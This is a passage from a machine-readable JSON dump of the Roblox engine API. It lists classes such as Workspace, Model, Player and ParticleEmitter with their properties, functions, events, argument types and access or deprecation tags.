"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Array","Name":"materials","Default":null},{"Type":"Array","Name":"occupancy","Default":null}],"Name":"WriteVoxels","tags":[],"Class":"Terrain","type":"Function"},{"Superclass":"BasePart","type":"Class","Name":"TrussPart","tags":[]},{"ValueType":"Style","type":"Property","Name":"Style","tags":[],"Class":"TrussPart"},{"Superclass":"BasePart","type":"Class","Name":"VehicleSeat","tags":[]},{"ValueType":"int","type":"Property","Name":"AreHingesDetected","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"HeadsUpDisplay","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"VehicleSeat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"Torque","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"TurnSpeed","tags":[],"Class":"VehicleSeat"},{"Superclass":"PVInstance","type":"Class","Name":"Model","tags":[]},{"ValueType":"Object","type":"Property","Name":"PrimaryPart","tags":[],"Class":"Model"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetExtentsSize","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetModelCFrame","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetModelSize","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"MoveTo","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetOrientationToIdentity","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetIdentityOrientation","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null}],"Name":"SetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"delta","Default":null}],"Name":"TranslateBy","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"move","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"moveTo","tags":["deprecated"],"Class":"Model","type":"Function"},{"Superclass":"Model","type":"Class","Name":"RootInstance","tags":["notbrowsable"]},{"Superclass":"RootInstance","type":"Class","Name":"Workspace","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowThirdPartySales","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"CurrentCamera","tags":[],"Class":"Workspace"},{"ValueType":"double","type":"Property","Name":"DistributedGameTime","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"FilteringEnabled","tags":[],"Class":"Workspace"},{"ValueType":"float","type":"Property","Name":"Gravity","tags":[],"Class":"Workspace"},{"ValueType":"bool","type":"Property","Name":"StreamingEnabled","tags":[],"Class":"Workspace"},{"ValueType":"Object","type":"Property","Name":"Terrain","tags":["readonly"],"Class":"Workspace"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"BreakJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"ExperimentalSolverIsEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRay","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"FindPartOnRayWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"FindPartsInRegion3WithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetNumAwakeParts","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"int","Name":"index","Default":null}],"Name":"GetPhysicsAnalyzerIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetPhysicsThrottling","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"double","Arguments":[],"Name":"GetRealPhysicsFPS","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"}],"Name":"IsRegion3Empty","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Objects","Name":"ignoreDescendentsTable","Default":null}],"Name":"IsRegion3EmptyWithIgnoreList","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null},{"Type":"JointCreationMode","Name":"jointType","Default":null}],"Name":"JoinToOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"MakeJoints","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"PGSIsEnabled","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetPhysicsAnalyzerBreakOnIssue","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetPhysicsThrottleEnabled","tags":["LocalUserSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Objects","Name":"objects","Default":null}],"Name":"UnjoinFromOutsiders","tags":[],"Class":"Workspace","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ZoomToExtents","tags":["PluginSecurity"],"Class":"Workspace","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Ray","Name":"ray","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"bool","Name":"terrainCellsAreCubes","Default":"false"},{"Type":"bool","Name":"ignoreWater","Default":"false"}],"Name":"findPartOnRay","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"Instance","Name":"ignoreDescendentsInstance","Default":"nil"},{"Type":"int","Name":"maxParts","Default":"20"}],"Name":"findPartsInRegion3","tags":["deprecated"],"Class":"Workspace","type":"Function"},{"Arguments":[{"Name":"count","Type":"int"}],"Name":"PhysicsAnalyzerIssuesFound","tags":["PluginSecurity"],"Class":"Workspace","type":"Event"},{"Superclass":"Model","type":"Class","Name":"Status","tags":["deprecated","notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Pages","tags":[]},{"ValueType":"bool","type":"Property","Name":"IsFinished","tags":["readonly"],"Class":"Pages"},{"ReturnType":"Array","Arguments":[],"Name":"GetCurrentPage","tags":[],"Class":"Pages","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"AdvanceToNextPageAsync","tags":[],"Class":"Pages","type":"YieldFunction"},{"Superclass":"Pages","type":"Class","Name":"DataStorePages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"FriendPages","tags":[]},{"Superclass":"Pages","type":"Class","Name":"StandardPages","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PartOperationAsset","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ParticleEmitter","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Acceleration","tags":[],"Class":"ParticleEmitter"},{"ValueType":"ColorSequence","type":"Property","Name":"Color","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Drag","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NormalId","type":"Property","Name":"EmissionDirection","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Lifetime","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"LightEmission","tags":[],"Class":"ParticleEmitter"},{"ValueType":"bool","type":"Property","Name":"LockedToPart","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"Rate","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"RotSpeed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Rotation","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Size","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberRange","type":"Property","Name":"Speed","tags":[],"Class":"ParticleEmitter"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"ParticleEmitter"},{"ValueType":"NumberSequence","type":"Property","Name":"Transparency","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocityInheritance","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"VelocitySpread","tags":[],"Class":"ParticleEmitter"},{"ValueType":"float","type":"Property","Name":"ZOffset","tags":[],"Class":"ParticleEmitter"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"particleCount","Default":"16"}],"Name":"Emit","tags":[],"Class":"ParticleEmitter","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Path","tags":[]},{"ValueType":"PathStatus","type":"Property","Name":"Status","tags":["readonly"],"Class":"Path"},{"ReturnType":"Array","Arguments":[],"Name":"GetPointCoordinates","tags":[],"Class":"Path","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"start","Default":null}],"Name":"CheckOcclusionAsync","tags":[],"Class":"Path","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PathfindingService","tags":["notCreatable"]},{"ValueType":"float","type":"Property","Name":"EmptyCutoff","tags":[],"Class":"PathfindingService"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeRawPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"Vector3","Name":"start","Default":null},{"Type":"Vector3","Name":"finish","Default":null},{"Type":"float","Name":"maxDistance","Default":null}],"Name":"ComputeSmoothPathAsync","tags":[],"Class":"PathfindingService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PersonalServerService","tags":[]},{"ValueType":"string","type":"Property","Name":"RoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Demote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"Promote","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerGetRankUrl","Default":null}],"Name":"SetPersonalServerGetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerRoleSetsUrl","Default":null}],"Name":"SetPersonalServerRoleSetsUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"personalServerSetRankUrl","Default":null}],"Name":"SetPersonalServerSetRankUrl","tags":["LocalUserSecurity"],"Class":"PersonalServerService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetRoleSets","tags":["RobloxScriptSecurity"],"Class":"PersonalServerService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"PhysicsPacketCache","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PhysicsSettings","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowSleep","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAnchorsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAssembliesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAttachmentsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreAwakePartsHighlighted","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreBodyTypesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreConstraintsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreContactPointsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreJointCoordinatesShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreMechanismsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreModelCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreOwnersShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ArePartCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreRegionsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreUnalignedPartsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"AreWorldCoordsShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsReceiveAgeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"IsTreeShown","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ParallelPhysics","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"PhysicsAnalyzerEnabled","tags":["PluginSecurity","readonly"],"Class":"PhysicsSettings"},{"ValueType":"EnviromentalPhysicsThrottle","type":"Property","Name":"PhysicsEnvironmentalThrottle","tags":[],"Class":"PhysicsSettings"},{"ValueType":"bool","type":"Property","Name":"ShowDecompositionGeometry","tags":[],"Class":"PhysicsSettings"},{"ValueType":"double","type":"Property","Name":"ThrottleAdjustTime","tags":[],"Class":"PhysicsSettings"},{"Superclass":"Instance","type":"Class","Name":"Player","tags":[]},{"ValueType":"int","type":"Property","Name":"AccountAge","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AppearanceDidLoad","tags":["RobloxScriptSecurity","deprecated","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"AutoJumpEnabled","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMaxZoomDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"CameraMinZoomDistance","tags":[],"Class":"Player"},{"ValueType":"CameraMode","type":"Property","Name":"CameraMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"CanLoadCharacterAppearance","tags":[],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"Character","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"CharacterAppearance","tags":["notbrowsable"],"Class":"Player"},{"ValueType":"ChatMode","type":"Property","Name":"ChatMode","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexity","tags":["readonly"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"DataComplexityLimit","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DataReady","tags":["readonly"],"Class":"Player"},{"ValueType":"DevCameraOcclusionMode","type":"Property","Name":"DevCameraOcclusionMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerCameraMovementMode","type":"Property","Name":"DevComputerCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevComputerMovementMode","type":"Property","Name":"DevComputerMovementMode","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"DevEnableMouseLock","tags":[],"Class":"Player"},{"ValueType":"DevTouchCameraMovementMode","type":"Property","Name":"DevTouchCameraMode","tags":[],"Class":"Player"},{"ValueType":"DevTouchMovementMode","type":"Property","Name":"DevTouchMovementMode","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"FollowUserId","tags":["readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Guest","tags":["RobloxScriptSecurity","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"HasBuildTools","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"HealthDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"MaximumSimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"MembershipType","type":"Property","Name":"MembershipType","tags":["readonly"],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"NameDisplayDistance","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"PersonalServerRank","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"Object","type":"Property","Name":"RespawnLocation","tags":[],"Class":"Player"},{"ValueType":"float","type":"Property","Name":"SimulationRadius","tags":["LocalUserSecurity"],"Class":"Player"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"Teleported","tags":["RobloxScriptSecurity","hidden","readonly"],"Class":"Player"},{"ValueType":"bool","type":"Property","Name":"TeleportedIn","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"UserId","tags":[],"Class":"Player"},{"ValueType":"string","type":"Property","Name":"VRDevice","tags":["RobloxScriptSecurity"],"Class":"Player"},{"ValueType":"int","type":"Property","Name":"userId","tags":["deprecated"],"Class":"Player"},{"ReturnType":"void","Arguments":[],"Name":"ClearCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"float","Arguments":[{"Type":"Vector3","Name":"point","Default":null}],"Name":"DistanceFromCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"FriendStatus","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"GetFriendStatus","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetGameSessionID","tags":["RobloxSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetMouse","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetUnder13","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"HasAppearanceLoaded","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"JumpCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Kick","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"inGame","Default":"true"}],"Name":"LoadCharacter","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"assetInstance","Default":null}],"Name":"LoadCharacterAppearance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"LoadData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"LoadString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"walkDirection","Default":null},{"Type":"bool","Name":"relativeToCamera","Default":"false"}],"Name":"Move","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector2","Name":"walkDirection","Default":null},{"Type":"float","Name":"maxWalkDelta","Default":null}],"Name":"MoveCharacter","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RemoveCharacter","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RequestFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null}],"Name":"RevokeFriendship","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"SaveBoolean","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"SaveInstance","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SaveLeaderboardData","tags":["LocalUserSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"SaveNumber","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SaveString","tags":[],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"accountAge","Default":null}],"Name":"SetAccountAge","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"MembershipType","Name":"membershipType","Default":null}],"Name":"SetMembershipType","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetSuperSafeChat","tags":["PluginSecurity"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetUnder13","tags":["RobloxSecurity","deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"loadString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"bool","Name":"value","Default":null}],"Name":"saveBoolean","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Instance","Name":"value","Default":null}],"Name":"saveInstance","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"double","Name":"value","Default":null}],"Name":"saveNumber","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"saveString","tags":["deprecated"],"Class":"Player","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"maxFriends","Default":"200"}],"Name":"GetFriendsOnline","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRankInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetRoleInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"string","Arguments":[],"Name":"GetWebPersonalServerRank","tags":["LocalUserSecurity","backend"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsBestFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"IsFriendsWith","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"IsInGroup","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"rank","Default":null}],"Name":"SetWebPersonalServerRank","tags":["WritePlayerSecurity"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"WaitForDataReady","tags":[],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"isFriendsWith","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[],"Name":"waitForDataReady","tags":["deprecated"],"Class":"Player","type":"YieldFunction"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAdded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterAppearanceLoaded","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"character","Type":"Instance"}],"Name":"CharacterRemoving","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"recipient","Type":"Instance"}],"Name":"Chatted","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"friendStatus","Type":"FriendStatus"}],"Name":"FriendStatusChanged","tags":["RobloxScriptSecurity"],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"time","Type":"double"}],"Name":"Idled","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"teleportState","Type":"TeleportState"},{"Name":"placeId","Type":"int"},{"Name":"spawnName","Type":"string"}],"Name":"OnTeleport","tags":[],"Class":"Player","type":"Event"},{"Arguments":[{"Name":"radius","Type":"float"}],"Name":"SimulationRadiusChanged","tags":["LocalUserSecurity"],"Class":"Player","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"PlayerScripts","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"Players","tags":[]},{"ValueType":"bool","type":"Property","Name":"BubbleChat","tags":["readonly"],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"CharacterAutoLoads","tags":[],"Class":"Players"},{"ValueType":"bool","type":"Property","Name":"ClassicChat","tags":["readonly"],"Class":"Players"},{"ValueType":"Object","type":"Property","Name":"LocalPlayer","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"MaxPlayersInternal","tags":["LocalUserSecurity"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"NumPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlayers","tags":["readonly"],"Class":"Players"},{"ValueType":"int","type":"Property","Name":"PreferredPlay